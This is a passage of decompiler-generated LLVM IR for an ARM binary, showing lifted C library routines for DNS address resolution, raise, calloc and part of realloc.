  %v0_1b378 = load i32, i32* @r4, align 4
  %v1_1b378 = load i32, i32* @r5, align 4
  %v2_1b378 = inttoptr i32 %v1_1b378 to i32*
  store i32 %v0_1b378, i32* %v2_1b378, align 4
  %v7_1b37c = icmp sgt i32 %v1_1b36c, 255
  br i1 %v7_1b37c, label %dec_label_pc_1b388, label %bb29

bb29:                                             ; preds = %dec_label_pc_1b360
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_1b380 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b380 = load i32, i32* @fp, align 4
  %v2_1b380 = inttoptr i32 %v1_1b380 to i32*
  store i32 %v0_1b380, i32* %v2_1b380, align 4
  br label %dec_label_pc_1b510

dec_label_pc_1b388:                               ; preds = %dec_label_pc_1b360
  %v0_1b3803 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b3804 = load i32, i32* @fp, align 4
  %v2_1b3805 = inttoptr i32 %v1_1b3804 to i32*
  store i32 %v0_1b3803, i32* %v2_1b3805, align 4
  %v0_1b388 = load i32, i32* @r8, align 4
  %v1_1b388 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b388 = add i32 %v1_1b388, %v0_1b388
  store i32 %v2_1b388, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_1b390 = add i32 %v2_1b388, 16
  store i32 %v1_1b390, i32* %r2.global-to-local, align 4
  %v1_1b394 = add i32 %v2_1b388, 24
  store i32 %v1_1b394, i32* @r5, align 4
  %v3_1b39c = inttoptr i32 %v1_1b390 to i32*
  store i32 %v2_1b388, i32* %v3_1b39c, align 4
  %v0_1b3a0 = load i32, i32* @sb, align 4
  store i32 %v0_1b3a0, i32* @r1, align 4
  %v0_1b3a4 = load i32, i32* @r4, align 4
  %v1_1b3a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b3a4 = add i32 %v1_1b3a4, 4
  %v3_1b3a4 = inttoptr i32 %v2_1b3a4 to i32*
  store i32 %v0_1b3a4, i32* %v3_1b3a4, align 4
  %v0_1b3a8 = load i32, i32* @r5, align 4
  store i32 %v0_1b3a8, i32* %r0.global-to-local, align 4
  %v0_1b3ac = load i32, i32* @sl, align 4
  store i32 %v0_1b3ac, i32* %r2.global-to-local, align 4
  %v3_1b3b0 = call i32 @strncpy(i32 %v0_1b3a8, i32 %v0_1b3a0, i32 %v0_1b3ac)
  %v0_1b3b4 = load i32, i32* @r4, align 4
  %v1_1b3b4 = trunc i32 %v0_1b3b4 to i8
  %v2_1b3b4 = load i32, i32* @r5, align 4
  %v3_1b3b4 = load i32, i32* @sl, align 4
  %v4_1b3b4 = add i32 %v3_1b3b4, %v2_1b3b4
  %v5_1b3b4 = inttoptr i32 %v4_1b3b4 to i8*
  store i8 %v1_1b3b4, i8* %v5_1b3b4, align 1
  %v0_1b3b8 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1b3c0 = load i32, i32* @r8, align 4
  store i32 %v0_1b3c0, i32* %r2.global-to-local, align 4
  %v3_1b3c4 = inttoptr i32 %v0_1b3b8 to i8*
  %v4_1b3c4 = call i32 @inet_pton(i32 10, i8* %v3_1b3c4, i32 %v0_1b3c0)
  store i32 %v4_1b3c4, i32* %r0.global-to-local, align 4
  %v1_1b3c8 = load i32, i32* @r4, align 4
  %v9_1b3c8 = icmp eq i32 %v4_1b3c4, %v1_1b3c8
  br i1 %v9_1b3c8, label %dec_label_pc_1b400, label %dec_label_pc_1b3d0

dec_label_pc_1b3d0:                               ; preds = %dec_label_pc_1b388
  store i32 %v1_1b390, i32* @ip, align 4
  %v0_1b3d8 = load i32, i32* @r6, align 4
  store i32 %v0_1b3d8, i32* %v2_1b2d4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_1b3e0 = load i32, i32* @r6, align 4
  %v2_1b3e0 = add i32 %v1_1b3e0, 8
  %v3_1b3e0 = inttoptr i32 %v2_1b3e0 to i32*
  store i32 10, i32* %v3_1b3e0, align 4
  %v0_1b3e4 = load i32, i32* @r4, align 4
  store i32 %v0_1b3e4, i32* %r0.global-to-local, align 4
  %v0_1b3e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b3e8 = add i32 %v0_1b3e8, 6
  store i32 %v1_1b3e8, i32* %r3.global-to-local, align 4
  %v1_1b3ec = load i32, i32* @r6, align 4
  %v2_1b3ec = add i32 %v1_1b3ec, 12
  %v3_1b3ec = inttoptr i32 %v2_1b3ec to i32*
  store i32 %v1_1b3e8, i32* %v3_1b3ec, align 4
  %v0_1b3f0 = load i32, i32* @r5, align 4
  %v1_1b3f0 = load i32, i32* @r6, align 4
  %v2_1b3f0 = inttoptr i32 %v1_1b3f0 to i32*
  store i32 %v0_1b3f0, i32* %v2_1b3f0, align 4
  %v0_1b3f4 = load i32, i32* @ip, align 4
  %v1_1b3f4 = load i32, i32* @r6, align 4
  %v2_1b3f4 = add i32 %v1_1b3f4, 16
  %v3_1b3f4 = inttoptr i32 %v2_1b3f4 to i32*
  store i32 %v0_1b3f4, i32* %v3_1b3f4, align 4
  %v0_1b3f8 = load i32, i32* @r4, align 4
  %v1_1b3f8 = load i32, i32* @fp, align 4
  %v2_1b3f8 = inttoptr i32 %v1_1b3f8 to i32*
  store i32 %v0_1b3f8, i32* %v2_1b3f8, align 4
  br label %dec_label_pc_1b510

dec_label_pc_1b400:                               ; preds = %dec_label_pc_1b388
  %v0_1b400 = load i32, i32* @r7, align 4
  %v2_1b400 = icmp eq i32 %v0_1b400, 0
  br i1 %v2_1b400, label %dec_label_pc_1b408, label %dec_label_pc_1b4fc

dec_label_pc_1b408:                               ; preds = %dec_label_pc_1b400
  %v2_1b408 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1b408, i32* @r4, align 4
  store i32 %v2_1b408, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_1b418 = bitcast i32* %stack_var_-80 to i8*
  %v3_1b418 = call i32 @__GI_memset(i8* %v2_1b418, i32 0)
  store i32 %v3_1b418, i32* %r0.global-to-local, align 4
  %v2_1b41c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1b41c, i32* @sb, align 4
  %v7_1b45c = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_1b420

dec_label_pc_1b420:                               ; preds = %dec_label_pc_1b474, %dec_label_pc_1b408
  store i32 %v2_1b41c, i32* %r2.global-to-local, align 4
  store i32 %v2_1b408, i32* %r3.global-to-local, align 4
  %v0_1b42c = load i32, i32* @r5, align 4
  store i32 %v0_1b42c, i32* %r0.global-to-local, align 4
  %v4_1b430 = inttoptr i32 %v0_1b42c to i8*
  %v5_1b430 = call i32 @__dns_lookup(i8* %v4_1b430, i32 28, i32 %v2_1b41c, i32 %v2_1b408)
  store i32 %v5_1b430, i32* @r4, align 4
  %v1_1b434 = icmp slt i32 %v5_1b430, 0
  %v0_1b438 = load i32, i32* @sl, align 4
  store i32 %v0_1b438, i32* %r2.global-to-local, align 4
  %v0_1b43c = load i32, i32* @r7, align 4
  %v1_1b43c = add i32 %v0_1b43c, 1
  store i32 %v1_1b43c, i32* @r7, align 4
  %v0_1b440 = load i32, i32* @r5, align 4
  store i32 %v0_1b440, i32* %r0.global-to-local, align 4
  br i1 %v1_1b434, label %dec_label_pc_1b4fc, label %dec_label_pc_1b448

dec_label_pc_1b448:                               ; preds = %dec_label_pc_1b420
  %v3_1b448 = load i32, i32* %stack_var_-80, align 4
  store i32 %v3_1b448, i32* @r1, align 4
  %v3_1b44c = call i32 @strncpy(i32 %v0_1b440, i32 %v3_1b448, i32 %v0_1b438)
  %v3_1b450 = load i32, i32* %stack_var_-80, align 4
  store i32 %v3_1b450, i32* @r0, align 4
  %v0_1b454 = call i32 @free()
  store i32 %v0_1b454, i32* %r0.global-to-local, align 4
  %v0_1b460 = load i32, i32* @r4, align 4
  store i32 %v0_1b460, i32* %r2.global-to-local, align 4
  %v0_1b464 = load i32, i32* @r5, align 4
  store i32 %v0_1b464, i32* %r3.global-to-local, align 4
  br i1 %v7_1b45c, label %dec_label_pc_1b46c, label %dec_label_pc_1b4a4

dec_label_pc_1b46c:                               ; preds = %dec_label_pc_1b448
  %v0_1b46c = load i32, i32* @r7, align 4
  %v8_1b470 = icmp sgt i32 %v0_1b46c, 5
  br i1 %v8_1b470, label %dec_label_pc_1b498, label %dec_label_pc_1b474

dec_label_pc_1b474:                               ; preds = %dec_label_pc_1b46c
  store i32 %tmp8, i32* @r1, align 4
  %v3_1b478 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1b478, i32* %r0.global-to-local, align 4
  %v0_1b47c = load i32, i32* @sl, align 4
  %v5_1b480 = call i32 @__decode_dotted(i32 %v3_1b478, i32 %tmp8, i32 %v0_1b460, i32 %v0_1b464, i32 %v0_1b47c)
  store i32 %v5_1b480, i32* @r4, align 4
  %v3_1b488 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1b488, i32* @r0, align 4
  %v0_1b48c = call i32 @free()
  store i32 %v0_1b48c, i32* %r0.global-to-local, align 4
  %v0_1b490 = load i32, i32* @r4, align 4
  %v1_1b490 = icmp slt i32 %v0_1b490, 0
  br i1 %v1_1b490, label %dec_label_pc_1b498, label %dec_label_pc_1b420

dec_label_pc_1b498:                               ; preds = %dec_label_pc_1b474, %dec_label_pc_1b46c
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b504

dec_label_pc_1b4a4:                               ; preds = %dec_label_pc_1b448
  %v7_1b4a4 = icmp eq i32 %tmp9, 28
  br i1 %v7_1b4a4, label %dec_label_pc_1b4ac, label %dec_label_pc_1b4f4

dec_label_pc_1b4ac:                               ; preds = %dec_label_pc_1b4a4
  store i32 16, i32* @r2, align 4
  %v0_1b4b4 = load i32, i32* @r8, align 4
  store i32 %v0_1b4b4, i32* @r0, align 4
  %v0_1b4b8 = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_1b390, i32* %r2.global-to-local, align 4
  %v1_1b4c4 = load i32, i32* @r6, align 4
  %v2_1b4c4 = add i32 %v1_1b4c4, 8
  %v3_1b4c4 = inttoptr i32 %v2_1b4c4 to i32*
  store i32 10, i32* %v3_1b4c4, align 4
  %v0_1b4c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1b4c8 = add i32 %v0_1b4c8, 6
  store i32 %v1_1b4c8, i32* %r3.global-to-local, align 4
  %v1_1b4cc = load i32, i32* @r6, align 4
  %v2_1b4cc = add i32 %v1_1b4cc, 12
  %v3_1b4cc = inttoptr i32 %v2_1b4cc to i32*
  store i32 %v1_1b4c8, i32* %v3_1b4cc, align 4
  %v3_1b4d0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1b4d0, i32* @r0, align 4
  %v0_1b4d4 = load i32, i32* @r5, align 4
  %v1_1b4d4 = load i32, i32* @r6, align 4
  %v2_1b4d4 = inttoptr i32 %v1_1b4d4 to i32*
  store i32 %v0_1b4d4, i32* %v2_1b4d4, align 4
  %v0_1b4d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b4d8 = load i32, i32* @r6, align 4
  %v2_1b4d8 = add i32 %v1_1b4d8, 16
  %v3_1b4d8 = inttoptr i32 %v2_1b4d8 to i32*
  store i32 %v0_1b4d8, i32* %v3_1b4d8, align 4
  %v0_1b4dc = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1b4ec = load i32, i32* @r6, align 4
  store i32 %v0_1b4ec, i32* %v2_1b2d4, align 4
  %v0_1b504.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b504

dec_label_pc_1b4f4:                               ; preds = %dec_label_pc_1b4a4
  %v3_1b4f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_1b4f4, i32* @r0, align 4
  %v0_1b4f8 = call i32 @free()
  store i32 %v0_1b4f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b4fc

dec_label_pc_1b4fc:                               ; preds = %dec_label_pc_1b420, %dec_label_pc_1b400, %dec_label_pc_1b4f4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1b504

dec_label_pc_1b504:                               ; preds = %dec_label_pc_1b4ac, %dec_label_pc_1b498, %dec_label_pc_1b4fc
  %v0_1b504 = phi i32 [ %v0_1b504.pre, %dec_label_pc_1b4ac ], [ 3, %dec_label_pc_1b498 ], [ 1, %dec_label_pc_1b4fc ]
  %v1_1b504 = load i32, i32* @fp, align 4
  %v2_1b504 = inttoptr i32 %v1_1b504 to i32*
  store i32 %v0_1b504, i32* %v2_1b504, align 4
  br label %dec_label_pc_1b510

dec_label_pc_1b50c:                               ; preds = %dec_label_pc_1b2c8, %dec_label_pc_1b2dc
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b510

dec_label_pc_1b510:                               ; preds = %bb, %bb29, %dec_label_pc_1b350, %dec_label_pc_1b334, %dec_label_pc_1b504, %dec_label_pc_1b3d0, %dec_label_pc_1b2a8, %dec_label_pc_1b50c
  store i32 %v9_1b280, i32* @r6, align 4
  store i32 %v12_1b280, i32* @r7, align 4
  store i32 %v15_1b280, i32* @r8, align 4
  store i32 %v18_1b280, i32* @sb, align 4
  store i32 %v21_1b280, i32* @sl, align 4
  store i32 %v24_1b280, i32* @fp, align 4
  %v29_1b514 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_1b514

; uselistorder directives
  uselistorder i32 %v2_1b408, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1b390, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1b364, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b510, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_1b50c, { 1, 0 }
  uselistorder label %dec_label_pc_1b504, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b4fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b360, { 2, 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1b518 = load i32, i32* @r4, align 4
  %v0_1b520 = call i32 @getpid()
  store i32 %v3_1b518, i32* @r4, align 4
  %v0_1b52c = call i32 @kill()
  ret i32 %v0_1b52c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @getpid, { 3, 4, 1, 2, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1b530 = load i32, i32* @r4, align 4
  %v6_1b530 = load i32, i32* @r5, align 4
  %v2_1b534 = icmp eq i32 %arg1, 0
  %v2_1b538 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @r4, align 4
  %v2_1b540 = mul i32 %arg2, %arg1
  store i32 %v2_1b540, i32* @r5, align 4
  br i1 %v2_1b534, label %dec_label_pc_1b570, label %dec_label_pc_1b548

dec_label_pc_1b548:                               ; preds = %entry
  %v2_1b550 = udiv i32 %v2_1b540, %arg1
  %v9_1b554 = icmp eq i32 %v2_1b550, %arg2
  br i1 %v9_1b554, label %dec_label_pc_1b570, label %dec_label_pc_1b55c

dec_label_pc_1b55c:                               ; preds = %dec_label_pc_1b548
  %v0_1b55c = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1b568 = inttoptr i32 %v0_1b55c to i32*
  store i32 12, i32* %v2_1b568, align 4
  br label %dec_label_pc_1b61c

dec_label_pc_1b570:                               ; preds = %dec_label_pc_1b548, %entry
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* @r2, align 4
  store i32 %v2_1b538, i32* @r0, align 4
  %v1_1b584 = call i32 @_pthread_cleanup_push_defer()
  %v2_1b594 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e330.1421 to i32))
  %v0_1b598 = load i32, i32* @r5, align 4
  %v1_1b59c = call i32 @malloc(i32 %v0_1b598)
  store i32 %v1_1b59c, i32* %r4.global-to-local, align 4
  %v2_1b5a0 = icmp eq i32 %v1_1b59c, 0
  br i1 %v2_1b5a0, label %.thread, label %dec_label_pc_1b5a8

dec_label_pc_1b5a8:                               ; preds = %dec_label_pc_1b570
  %v1_1b5a8 = add i32 %v1_1b59c, -4
  %v2_1b5a8 = inttoptr i32 %v1_1b5a8 to i32*
  %v3_1b5a8 = load i32, i32* %v2_1b5a8, align 4
  %v1_1b5ac = and i32 %v3_1b5a8, 2
  %v2_1b5ac = icmp eq i32 %v1_1b5ac, 0
  br i1 %v2_1b5ac, label %dec_label_pc_1b5b4, label %.thread

dec_label_pc_1b5b4:                               ; preds = %dec_label_pc_1b5a8
  %v1_1b5b45 = add i32 %v3_1b5a8, -4
  %v1_1b5b8 = and i32 %v1_1b5b45, -4
  store i32 %v1_1b5b8, i32* @r2, align 4
  %v3_1b5bc = udiv i32 %v1_1b5b8, 4
  store i32 %v3_1b5bc, i32* @ip, align 4
  %tmp = icmp eq i32 %v1_1b5b8, 36
  %v2_1b5c4 = icmp ult i32 %v1_1b5b8, 33
  %v3_1b5c4 = or i1 %tmp, %v2_1b5c4
  br i1 %v3_1b5c4, label %dec_label_pc_1b5d0, label %dec_label_pc_1b5c8

dec_label_pc_1b5c8:                               ; preds = %dec_label_pc_1b5b4
  %v2_1b5c8 = inttoptr i32 %v1_1b59c to i8*
  %v3_1b5c8 = call i32 @__GI_memset(i8* %v2_1b5c8, i32 0)
  br label %.thread

dec_label_pc_1b5d0:                               ; preds = %dec_label_pc_1b5b4
  %tmp6 = icmp eq i32 %v1_1b5b8, 16
  %v2_1b5d4 = inttoptr i32 %v1_1b59c to i32*
  store i32 0, i32* %v2_1b5d4, align 4
  %v1_1b5d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b5d8 = add i32 %v1_1b5d8, 4
  %v3_1b5d8 = inttoptr i32 %v2_1b5d8 to i32*
  store i32 0, i32* %v3_1b5d8, align 4
  %v1_1b5dc = load i32, i32* %r4.global-to-local, align 4
  %v2_1b5dc = add i32 %v1_1b5dc, 8
  %v3_1b5dc = inttoptr i32 %v2_1b5dc to i32*
  store i32 0, i32* %v3_1b5dc, align 4
  %v2_1b5e0 = icmp ult i32 %v1_1b5b8, 13
  %v3_1b5e0 = or i1 %tmp6, %v2_1b5e0
  br i1 %v3_1b5e0, label %.thread, label %dec_label_pc_1b5e4

dec_label_pc_1b5e4:                               ; preds = %dec_label_pc_1b5d0
  %v0_1b5e4 = load i32, i32* @ip, align 4
  %v1_1b5e8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b5e8 = add i32 %v1_1b5e8, 12
  %v3_1b5e8 = inttoptr i32 %v2_1b5e8 to i32*
  store i32 0, i32* %v3_1b5e8, align 4
  %v1_1b5ec = load i32, i32* %r4.global-to-local, align 4
  %v2_1b5ec = add i32 %v1_1b5ec, 16
  %v3_1b5ec = inttoptr i32 %v2_1b5ec to i32*
  store i32 0, i32* %v3_1b5ec, align 4
  %tmp7 = icmp ult i32 %v0_1b5e4, 7
  br i1 %tmp7, label %.thread, label %dec_label_pc_1b5f4

dec_label_pc_1b5f4:                               ; preds = %dec_label_pc_1b5e4
  %v0_1b5f4 = load i32, i32* @ip, align 4
  %v7_1b5f4 = icmp eq i32 %v0_1b5f4, 9
  %v1_1b5f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1b5f8 = add i32 %v1_1b5f8, 20
  %v3_1b5f8 = inttoptr i32 %v2_1b5f8 to i32*
  store i32 0, i32* %v3_1b5f8, align 4
  %v1_1b5fc = load i32, i32* %r4.global-to-local, align 4
  %v2_1b5fc = add i32 %v1_1b5fc, 24
  %v3_1b5fc = inttoptr i32 %v2_1b5fc to i32*
  store i32 0, i32* %v3_1b5fc, align 4
  br i1 %v7_1b5f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1b5f4
  %v2_1b600 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b600 = add i32 %v2_1b600, 32
  %v4_1b600 = inttoptr i32 %v3_1b600 to i32*
  store i32 0, i32* %v4_1b600, align 4
  %v2_1b604 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b604 = add i32 %v2_1b604, 28
  %v4_1b604 = inttoptr i32 %v3_1b604 to i32*
  store i32 0, i32* %v4_1b604, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1b5f4, %dec_label_pc_1b5a8, %dec_label_pc_1b5e4, %dec_label_pc_1b5d0, %dec_label_pc_1b570, %dec_label_pc_1b5c8, %bb
  store i32 %v2_1b538, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 112156, i32* @lr, align 4
  %v1_1b618 = call i32 @_pthread_cleanup_pop_restore()
  br label %dec_label_pc_1b61c

dec_label_pc_1b61c:                               ; preds = %dec_label_pc_1b55c, %.thread
  %v0_1b61c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1b530, i32* @r4, align 4
  store i32 %v6_1b530, i32* @r5, align 4
  ret i32 %v0_1b61c

; uselistorder directives
  uselistorder i32 %v1_1b5b8, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_1b59c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b61c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_1b63c = load i32, i32* @r4, align 4
  %v6_1b63c = load i32, i32* @r5, align 4
  %v9_1b63c = load i32, i32* @r6, align 4
  %v12_1b63c = load i32, i32* @r7, align 4
  %v15_1b63c = load i32, i32* @r8, align 4
  %v18_1b63c = load i32, i32* @sb, align 4
  %v21_1b63c = load i32, i32* @sl, align 4
  %v24_1b63c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1b640 = icmp eq i32* %arg1, null
  %v2_1b644 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_1b640, label %dec_label_pc_1b650, label %dec_label_pc_1b660

dec_label_pc_1b650:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_1b654 = call i32 @malloc(i32 %arg2)
  store i32 %v1_1b654, i32* %r0.global-to-local, align 4
  store i32 %v1_1b654, i32* @r4, align 4
  br label %dec_label_pc_1b980

dec_label_pc_1b660:                               ; preds = %entry
  %v2_1b660 = icmp eq i32 %arg2, 0
  br i1 %v2_1b660, label %dec_label_pc_1b668, label %dec_label_pc_1b670

dec_label_pc_1b668:                               ; preds = %dec_label_pc_1b660
  %v0_1b668 = call i32 @free()
  store i32 %v0_1b668, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b980

dec_label_pc_1b670:                               ; preds = %dec_label_pc_1b660
  store i32 %v2_1b644, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* @r2, align 4
  store i32 98440, i32* %r3.global-to-local, align 4
  %v1_1b684 = call i32 @_pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2e330.1421 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* %r3.global-to-local, align 4
  store i32 112280, i32* @lr, align 4
  %v2_1b694 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_2e330.1421 to i32))
  store i32 %v2_1b694, i32* %r0.global-to-local, align 4
  %v0_1b698 = load i32, i32* @r4, align 4
  %tmp32 = icmp ult i32 %v0_1b698, -32
  br i1 %tmp32, label %dec_label_pc_1b6b4, label %dec_label_pc_1b6a0

dec_label_pc_1b6a0:                               ; preds = %dec_label_pc_1b670
  %v0_1b6a0 = call i32 @__GI___errno_location()
  store i32 %v0_1b6a0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1b6ac = inttoptr i32 %v0_1b6a0 to i32*
  store i32 12, i32* %v2_1b6ac, align 4
  br label %dec_label_pc_1b980

dec_label_pc_1b6b4:                               ; preds = %dec_label_pc_1b670
  %v1_1b6b4 = add i32 %v0_1b698, 11
  store i32 %v1_1b6b4, i32* %r0.global-to-local, align 4
  %v0_1b6b8 = load i32, i32* @r5, align 4
  %v1_1b6b8 = add i32 %v0_1b6b8, -4
  %v2_1b6b8 = inttoptr i32 %v1_1b6b8 to i32*
  %v3_1b6b8 = load i32, i32* %v2_1b6b8, align 4
  store i32 %v3_1b6b8, i32* %r2.global-to-local, align 4
  %v2_1b6bc = icmp ugt i32 %v1_1b6b4, 14
  %v7_1b6bc = icmp eq i32 %v1_1b6b4, 15
  %v2_1b6c0 = xor i1 %v2_1b6bc, true
  %v3_1b6c0 = or i1 %v7_1b6bc, %v2_1b6c0
  br i1 %v3_1b6c0, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_1b6b4
  store i32 16, i32* @sb, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_1b6b4, %bb
  %v2_1b6c4 = xor i1 %v7_1b6bc, true
  %v3_1b6c4 = and i1 %v2_1b6bc, %v2_1b6c4
  br i1 %v3_1b6c4, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v5_1b6c4 = and i32 %v1_1b6b4, -8
  store i32 %v5_1b6c4, i32* @sb, align 4
  br label %bb25

bb25:                                             ; preds = %bb23, %bb24
  %v1_1b6c8 = and i32 %v3_1b6b8, 2
  %v2_1b6c8 = icmp eq i32 %v1_1b6c8, 0
  %v1_1b6cc = add i32 %v0_1b6b8, -8
  store i32 %v1_1b6cc, i32* @sl, align 4
  %v1_1b6d0 = and i32 %v3_1b6b8, -4
  store i32 %v1_1b6d0, i32* @r6, align 4
  br i1 %v2_1b6c8, label %dec_label_pc_1b6d8, label %dec_label_pc_1b8a8

dec_label_pc_1b6d8:                               ; preds = %bb25
  %v1_1b6d8 = load i32, i32* @sb, align 4
  %v3_1b6d8 = icmp ult i32 %v1_1b6d0, %v1_1b6d8
  br i1 %v3_1b6d8, label %dec_label_pc_1b6e4, label %bb26

bb26:                                             ; preds = %dec_label_pc_1b6d8
  store i32 %v1_1b6d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b840

dec_label_pc_1b6e4:                               ; preds = %dec_label_pc_1b6d8
  store i32 ptrtoint (i32* @global_var_3471c.1425 to i32), i32* %r0.global-to-local, align 4
  %v3_1b6e8 = load i32, i32* @global_var_34748.1431, align 4
  store i32 %v3_1b6e8, i32* %r3.global-to-local, align 4
  %v2_1b6ec = add i32 %v1_1b6d0, %v1_1b6cc
  store i32 %v2_1b6ec, i32* @r4, align 4
  %v9_1b6f0 = icmp eq i32 %v2_1b6ec, %v3_1b6e8
  %v1_1b6f4 = add i32 %v2_1b6ec, 4
  %v2_1b6f4 = inttoptr i32 %v1_1b6f4 to i32*
  %v3_1b6f4 = load i32, i32* %v2_1b6f4, align 4
  store i32 %v3_1b6f4, i32* %r1.global-to-local, align 4
  br i1 %v9_1b6f0, label %dec_label_pc_1b6fc, label %dec_label_pc_1b738

dec_label_pc_1b6fc:                               ; preds = %dec_label_pc_1b6e4
  %v1_1b6fc = and i32 %v3_1b6f4, -4
  %v2_1b700 = add i32 %v1_1b6fc, %v1_1b6d0
  store i32 %v2_1b700, i32* %r1.global-to-local, align 4
  %v1_1b704 = add i32 %v1_1b6d8, 16
  store i32 %v1_1b704, i32* %r3.global-to-local, align 4
  %v3_1b708 = icmp ult i32 %v2_1b700, %v1_1b704
  br i1 %v3_1b708, label %dec_label_pc_1b78c, label %dec_label_pc_1b710

dec_label_pc_1b710:                               ; preds = %dec_label_pc_1b6fc
  %v2_1b710 = sub i32 %v2_1b700, %v1_1b6d8
  %v1_1b714 = urem i32 %v3_1b6b8, 2
  %v2_1b718 = add i32 %v1_1b6d8, %v1_1b6cc
  store i32 %v2_1b718, i32* %r1.global-to-local, align 4
  %v2_1b71c = or i32 %v1_1b6d8, %v1_1b714
